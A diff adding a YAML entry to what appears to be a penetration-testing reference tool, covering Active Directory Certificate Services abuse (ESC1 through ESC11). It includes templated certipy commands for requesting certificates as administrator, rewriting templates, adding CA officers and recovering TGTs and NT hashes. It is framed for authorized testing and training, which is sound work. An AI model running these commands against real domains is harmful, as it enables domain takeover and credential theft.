@@ -1,0 +1,170 @@
+# Cephalo content — AD Certificate Services abuse (AD-8 / Certified Pre-Owned).
+# Authorized testing only. ESC abuses are template/CA-prerequisite-specific, so each
+# is confidence:'unverified' + cited — enumerate with `certipy find` FIRST and confirm
+# the exact prerequisites before abusing. Never assume a template is vulnerable.
+sections:
+  - id: ad.p10.adcs
+    title: AD Certificate Services (ADCS / ESC)
+    os: ad
+    phase: credential-access
+    order: 112
+    description: ESC1-ESC11 misconfigurations and the certificate → TGT auth flow.
+    techniques: [ad.adcs.esc1, ad.adcs.esc234, ad.adcs.esc67, ad.adcs.esc8, ad.adcs.auth, ad.adcs.esc91011]
+    packs: [oscp]
+
+techniques:
+  - id: ad.adcs.esc1
+    title: ESC1 — enrollee-supplied SAN
+    os: [ad]
+    phase: credential-access
+    summary: A template lets the enrollee specify the SAN — request a cert AS a DA.
+    body: |
+      ESC1: the template has "Enrollee Supplies Subject" + client-auth EKU and is
+      enrollable by low-priv users. Request a certificate with an `-upn` of a
+      privileged account, then authenticate as them. Prerequisites are
+      environment-specific — confirm with `certipy find -vulnerable` first.
+    commands: [ad.adcs.esc1.req]
+    prerequisites: [ad.credaccess.adcs]
+    tags: [acl-abuse, credential-access]
+    archetypeBand: high
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+    relatedIds: [ad.credaccess.adcs, ad.adcs.auth]
+
+  - id: ad.adcs.esc234
+    title: ESC2 / ESC3 / ESC4 — Any-Purpose, Enrollment Agent, template ACL
+    os: [ad]
+    phase: credential-access
+    summary: Any-Purpose/SubCA EKUs (ESC2), Enrollment-Agent abuse (ESC3), writable template (ESC4).
+    body: |
+      ESC2 (Any Purpose / no EKU), ESC3 (Certificate Request Agent EKU → enroll on
+      behalf of others), ESC4 (you hold write rights over the template, so make it
+      ESC1-vulnerable, then exploit). All are prerequisite-specific — verify before use.
+    commands: [ad.adcs.esc4.template]
+    tags: [acl-abuse, credential-access]
+    archetypeBand: high
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.adcs.esc67
+    title: ESC6 / ESC7 — CA flag & CA roles
+    os: [ad]
+    phase: credential-access
+    summary: EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (ESC6); CA Officer/Manager rights (ESC7).
+    body: |
+      ESC6: the CA honours requester-supplied SANs globally (an attribute flag set
+      on the CA) — any template becomes ESC1-like. ESC7: with ManageCA / ManageCertificates
+      you can add yourself as an officer and issue/approve requests. Confirm the CA state first.
+    commands: [ad.adcs.esc7.officer]
+    tags: [acl-abuse, credential-access]
+    archetypeBand: high
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.adcs.esc8
+    title: ESC8 — NTLM relay to web enrollment
+    os: [ad]
+    phase: credential-access
+    summary: Relay a coerced machine's NTLM auth to the ADCS web-enrollment endpoint.
+    body: |
+      ESC8 weaponises the HTTP enrollment interface: coerce a target (often a DC) and
+      relay its NTLM auth to `/certsrv` to mint a certificate as that machine — see the
+      NTLM-relay technique for the runnable ntlmrelayx command.
+    commands: []
+    tags: [ntlm, credential-access]
+    archetypeBand: high
+    references: [ref.certipy, ref.impacket]
+    confidence: unverified
+    packs: [oscp]
+    relatedIds: [ad.cred.relay, ad.adcs.auth]
+
+  - id: ad.adcs.auth
+    title: Certificate → TGT (PKINIT / UnPAC-the-hash)
+    os: [ad]
+    phase: credential-access
+    summary: Authenticate with a minted certificate to recover a TGT and the NT hash.
+    body: |
+      Once you hold a client-auth certificate for a principal, PKINIT yields a TGT;
+      certipy's auth (or PKINITtools) also recovers the account's NT hash via
+      UnPAC-the-hash. The certificate flow itself is canonical and not template-specific.
+    commands: [ad.adcs.auth.pkinit]
+    tags: [kerberos, credential-access]
+    archetypeBand: high
+    references: [ref.certipy, ref.pkinittools]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.adcs.esc91011
+    title: ESC9 / ESC10 / ESC11 (noted)
+    os: [ad]
+    phase: credential-access
+    summary: szOID / no-security-extension and RPC-enrollment variants — verify per environment.
+    body: |
+      ESC9 (no security extension), ESC10 (weak certificate mappings), ESC11 (RPC
+      enrollment relay) are newer and highly environment-specific. Treat as leads to
+      validate with certipy in the target before relying on them.
+    commands: []
+    tags: [credential-access]
+    archetypeBand: low
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+
+commands:
+  - id: ad.adcs.esc1.req
+    title: ESC1 request with SAN (certipy)
+    template: "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{DC_IP}} -ca {{CA}} -target {{CA_HOST}} -template {{TEMPLATE}} -upn administrator@{{DOMAIN}}"
+    tool: certipy
+    description: Enroll a cert specifying a privileged UPN in the SAN.
+    os: [ad]
+    phase: credential-access
+    tags: [acl-abuse]
+    notes:
+      - "Only works if the template's prerequisites match ESC1 — confirm with certipy find -vulnerable."
+    confidence: unverified
+    references: [ref.certipy]
+    danger: critical
+    packs: [oscp]
+  - id: ad.adcs.esc4.template
+    title: ESC4 template overwrite (certipy)
+    template: "certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{DC_IP}} -template {{TEMPLATE}} -write-default-configuration"
+    tool: certipy
+    description: With write rights, reconfigure a template to be enrollee-SAN vulnerable.
+    os: [ad]
+    phase: credential-access
+    tags: [acl-abuse]
+    notes:
+      - "Save the original configuration and restore it after the engagement."
+    confidence: unverified
+    references: [ref.certipy]
+    danger: critical
+    packs: [oscp]
+  - id: ad.adcs.esc7.officer
+    title: ESC7 add CA officer (certipy)
+    template: "certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{DC_IP}} -ca {{CA}} -add-officer {{USER}}"
+    tool: certipy
+    description: With ManageCA rights, grant yourself officer rights to issue certs.
+    os: [ad]
+    phase: credential-access
+    tags: [acl-abuse]
+    confidence: unverified
+    references: [ref.certipy]
+    danger: critical
+    packs: [oscp]
+  - id: ad.adcs.auth.pkinit
+    title: Authenticate with a certificate (certipy)
+    template: "certipy auth -pfx administrator.pfx -dc-ip {{DC_IP}}"
+    tool: certipy
+    description: PKINIT with the minted .pfx to obtain a TGT and the account NT hash.
+    os: [ad]
+    phase: credential-access
+    tags: [kerberos]
+    notes:
+      - "Clock skew > 5 min breaks PKINIT — sync to the DC first."
+    confidence: verified
+    references: [ref.certipy, ref.pkinittools]
+    danger: high
+    packs: [oscp]
